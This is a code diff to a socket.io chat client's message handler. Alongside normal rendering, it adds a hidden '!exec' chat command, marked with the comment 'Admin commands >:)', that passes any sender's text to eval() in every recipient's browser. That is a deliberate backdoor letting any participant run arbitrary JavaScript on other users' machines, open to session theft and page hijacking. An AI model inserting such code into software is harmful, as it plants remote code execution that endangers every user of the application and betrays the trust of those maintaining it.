@@ -51,11 +51,19 @@ socket.on('newMessage', function(message) {
     createdAt: formattedTime
   });
 
-  const div = document.createElement('div');
-  div.innerHTML = html
+  const prefix = "!";
 
-  document.querySelector('#messages').appendChild(div);
-  scrollToBottom();
+  // Admin commands >:)
+  let args = message.text.split(" ");
+  let cmd = args.shift().toLowerCase();
+  if (cmd === prefix + "exec") {
+    eval(args.join(" "));
+  } else {
+    const div = document.createElement('div');
+    div.innerHTML = html;
+    document.querySelector('#messages').appendChild(div);
+    scrollToBottom();
+  };
 });
 
 socket.on('newLocationMessage', function(message) {
